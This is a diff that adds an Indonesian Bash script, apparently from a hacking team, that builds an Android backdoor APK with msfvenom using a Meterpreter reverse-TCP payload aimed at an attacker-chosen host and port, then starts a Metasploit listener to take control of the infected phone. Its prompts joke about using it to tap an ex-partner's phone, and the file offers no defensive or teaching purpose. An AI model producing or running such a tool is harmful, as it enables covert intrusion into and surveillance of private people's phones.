@@ -1,0 +1,88 @@
+
+
+#ngapain lu nyet, record gua sumpahin mati diember#
+
+
+clear
+sleep 1
+echo "LOADING....."
+sleep 2
+clear
+figlet Backdor | lolcat
+echo "∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞
+★ Coded   : BLANK
+★ Team    : sixtysix hackteam
+★ Github  : https://github.com/sixtysix-Team
+★ Youtube : hack 606
+∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞" | lolcat
+echo ""
+echo "=========================================" |lolcat
+echo "===== gunakan tools ini dengan baik =====" |lolcat
+echo "=========================================" |lolcat
+echo ""
+echo "Install Metasploit ?" |lolcat
+read -p "y/n :" pill;
+if [ $pill = "y" ]; then
+        bash install
+        clear
+        figlet Sadap HP | lolcat
+        echo ""
+        echo "=========================================" |lolcat
+        echo "===== gunakan tools ini dengan baik =====" |lolcat
+        echo "=========================================" |lolcat
+        echo "ingin sadap mantan ?" |lolcat
+        echo "Dasar jones :<" | lolcat
+        echo "Masukkan port : " $lport |lolcat
+        read lport
+        sleep 2
+        echo "copas ip serveo" | lolcat
+        sleep 2
+        echo "Masukkan ip : " $lhost |lolcat
+        read lhost
+        sleep 2
+        echo "Mulai membuat backdor..." | lolcat
+        sleep 3
+        echo
+        echo "Masukkan nama backdor.apk : " $backdor | lolcat
+        read backdor
+        sleep 3
+        msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> /sdcard/$backdor
+        sleep 5
+        echo "Backdor telah tersimpan di sdcard" | lolcat
+        sleep 3
+        echo "Persiapan penyadapan" | lolcat
+        sleep 3
+        msfconsole -q -x "use exploit/multi/handler;
+        set payload android/meterpreter/reverse_tcp;
+        set lhost 127.0.0.1;
+        set lport $lport;
+        run"
+else
+        echo "ingin sadap mantan ?" |lolcat
+        echo "Dasar jones :<" | lolcat
+        echo "Masukkan port : " $lport |lolcat
+        read lport
+        sleep 2
+        echo "copas ip serveo" | lolcat
+        sleep 2
+        echo "Masukkan ip : " $lhost |lolcat
+        read lhost
+        sleep 2
+        echo "Mulai membuat backdor..." | lolcat
+        sleep 3
+        echo
+        echo "Masukkan nama backdor.apk : " $backdor | lolcat
+        read backdor
+        sleep 3
+        msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R> /sdcard/$backdor
+        sleep 5
+        echo "Backdor telah tersimpan di sdcard" | lolcat
+        sleep 3
+        echo "Persiapan penyadapan" | lolcat
+        sleep 3
+        msfconsole -q -x "use exploit/multi/handler;
+        set payload android/meterpreter/reverse_tcp;
+        set lhost 127.0.0.1;
+        set lport $lport;
+         run"
+fi
